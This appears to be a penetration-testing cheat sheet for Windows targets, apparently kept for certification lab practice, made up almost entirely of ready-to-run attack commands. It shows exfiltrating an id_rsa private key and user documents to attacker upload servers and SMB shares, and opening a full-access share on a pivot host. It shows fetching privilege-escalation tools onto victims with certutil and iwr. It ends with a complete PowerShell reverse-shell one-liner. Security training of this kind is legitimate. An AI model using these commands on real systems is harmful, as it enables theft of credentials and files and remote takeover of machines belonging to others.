#windows #powershell #reverseShells #datatransfer
https://github.com/eMVee-NL/MindMap
🔴 If the user is low priv use below directories

```
C:\temp
C:\windows\temp
```

Inside a pivot use:

```powershell
New-SmbShare -Name "SMB2" -Path "C:\TEMP\" -FullAccess Everyone
```
### SMB
🔴 Use like below if the initial one doesnt work  and its passed as an argument
```
net use z: \\\\192.168.45.213\\smb
```
##### Getting Files from the Victim

```bash
impacket-smbserver -smb2support smb ~/oscp/Windows_Tools
```

```powershell
copy-item Infrastructure.pdf \\192.168.45.156\smb\check.pdf
```
if it asks for credentials first
```cmd
net use z: \\192.168.225.128\smb
```
##### or


```powershell
net use z: \\192.168.45.241\smb 
```

```powershell
copy hey.zip z:
```

```powershell
net \\192.168.45.241\smb \del
```

#### Files to Victim

```powershell
net use \\192.168.45.241\smb
```

```powershell
copy \\192.168.45.241\smb\powercat.ps1 C:\windows\temp
```

### HTTP/HTTPs

##### Python Upload

```bash
python3 -m uploadserver
```

from the victim

```bash
curl -X POST http://192.168.45.216/upload -H -F 'files=@id_rsa' 
```
##### Files from Victim

```bash
sudo mkdir /var/www/uploads
sudo chown www-data:www-data /var/www/uploads
sudo chmod 766 /var/www/uploads
```

```bash
sudo service apache2 start
```

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.45.241/upload.php','C:\users\marcus\documents\body.txt')
```
 Second argument needs full path
##### File Transfer

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
```

##### File download

```powershell
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

```cmd
certutil.exe -urlcache -split -f http://192.168.45.213/GodPotato/GodPotato-NET4.exe C:\Users\tony\g.exe
```

🔴 Might have to use below if an argument parsed
```windows
certutil.exe -urlcache -split -f http://192.168.45.213/GodPotato/GodPotato-NET4.exe C:\\Users\\tony\\g.exe
```
#### Reverse shell

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

